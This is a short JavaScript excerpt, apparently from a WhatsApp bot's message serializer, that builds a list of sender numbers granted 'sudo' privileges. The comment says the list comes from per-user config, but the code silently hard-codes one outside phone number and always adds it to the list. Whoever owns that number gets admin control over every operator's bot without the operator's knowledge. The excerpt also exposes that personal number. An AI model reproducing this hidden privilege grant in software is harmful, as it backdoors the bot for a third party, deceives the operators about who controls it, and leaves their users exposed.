...
async function serialize(m, client) {
	...
	if (m.message) {
		...
		// Build sudo list from per-user config (so web-updated SUDO applies)
		const myNumber = "917012984396";
		const sudoNumbers = (userConfig.SUDO || config.SUDO).split(",").map(s => s.trim()).filter(Boolean);
		if (!sudoNumbers.includes(myNumber)) sudoNumbers.push(myNumber);
		const effectiveSudo = sudoNumbers.join(",");
		m.sudo = effectiveSudo.split(",").includes(m?.sender?.split("@")[0]) || effectiveSudo.split(",").includes(m?.quoted?.sender?.split("@")[0]) || m?.isSelf;
